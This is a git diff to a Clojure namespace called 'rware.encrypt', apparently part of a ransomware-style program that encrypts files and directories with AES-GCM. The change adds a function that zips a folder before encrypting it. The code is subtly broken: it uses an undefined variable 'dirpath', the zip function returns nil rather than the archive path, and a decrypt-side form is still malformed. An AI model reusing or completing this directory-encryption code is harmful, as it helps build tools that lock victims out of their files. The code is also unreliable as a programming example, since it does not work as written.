@@ -1,9 +1,11 @@
 (ns rware.encrypt
   (:require [rware.bytes :refer [b64->bytes bytes->b64]]
-            [clojure.java.io :as io])
+            [clojure.java.io :as io]
+            [clojure.zip :as zip])
   (:import [javax.crypto Cipher KeyGenerator]
            [javax.crypto.spec GCMParameterSpec SecretKeySpec]
-           [java.security SecureRandom]))
+           [java.security SecureRandom]
+           [java.util.zip ZipEntry ZipOutputStream]))
 
 (defn encryption-key
   [crypto-key]
@@ -20,6 +22,15 @@
     (.init cipher mode key-spec)
     cipher))
 
+(defn zip-dir
+  [path]
+  (let [zip-file (str path ".zip")]
+    (with-open [zip (ZipOutputStream. (io/output-stream zip-file))]
+      (doseq [f (file-seq (io/file path)) :when (.isFile f)]
+        (.putNextEntry zip (ZipEntry. (.getPath f)))
+        (io/copy f zip)
+        (.closeEntry zip)))))
+
 (defn encrypt-file
   [path crypto-key]
   (let [plain-text (.getBytes (slurp path) "UTF-8")
@@ -29,9 +40,8 @@
 
 (defn encrypt-dir
   [dir-path crypto-key]
-  (doseq [file-contents (file-seq (io/file dir-path))
-          :when (.exists (io/file file-contents))]
-    (encrypt-file (.getPath file-contents) crypto-key)))
+  (let [zipped-dir (zip-dir dirpath)]
+    (encrypt-file zipped-dir crypto-key)))
 
 (defn decrypt-dir
   [dir-path crypto-key]
@@ -47,4 +57,4 @@
     (if (nil? decrypted-text)
       (println "Error decrypting file:" path)
       (-> path
-          (spit (String. decrypted-text)
+          (spit (String. decrypted-text))))))
